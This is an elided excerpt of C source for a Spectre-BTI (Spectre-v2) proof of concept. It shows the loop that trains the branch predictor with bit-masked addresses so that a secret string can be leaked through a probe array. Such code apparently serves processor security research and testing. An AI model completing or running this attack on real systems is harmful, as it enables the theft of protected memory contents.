 ...
 * - Complete control of an guideArray (address, contents, size) and an probeArray (contents, size)
...
//uint8_t placeHolder[32]; // TBD: this placeHolder array can not be omitted for unknown reasons. 
...
int main(void){
	...
	printf("- Type of Attack: Spectre-BTI (a.k.a Spectre-v2)\n");
	...
	uint64_t passInAddr, passInIdx, randIdx, mixed_i;
	...
	for(uint64_t len = 0; len < (strlen(secretString)); len++){
		...
		for(uint64_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
			...
			for(int64_t j = TRAIN_TIMES-1; j >= 0; j--){
				...
				//	   training creates a false hit in probeArray for that guideArray value (you want this to be ignored by having it changed)
				passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFFFFFF; // Originally 0xFFFF for 32 bit. After every TRAIN_TIMES set passInAddr=...FFFFFFFF00000000 else 0
				passInAddr = (passInAddr | (passInAddr >> 32)); // Originally 16 for 32 bit. set the passInAddr=-1 or 0
